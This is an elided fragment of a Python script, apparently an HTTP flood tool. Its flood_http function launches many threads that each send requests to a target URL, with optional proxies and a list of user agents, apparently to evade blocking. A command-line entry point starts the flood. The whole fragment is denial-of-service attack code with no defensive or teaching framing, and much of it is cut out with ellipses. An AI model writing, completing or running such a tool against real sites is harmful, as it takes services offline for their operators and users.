...
def send_requests(target_url, num_connections, packet_size, headers, proxies=None):
    user_agents = [
...
def flood_http(target_url, initial_threads, initial_connections, packet_size, headers, proxies=None):
    threads = []

    for _ in range(initial_threads):
        thread = threading.Thread(target=send_requests, args=(target_url, initial_connections, packet_size, headers, proxies))
        thread.start()
...
if __name__ == "__main__":
    ...
    flood_http(args.target_url, args.initial_threads, args.initial_connections, args.packet_size, headers, proxies)
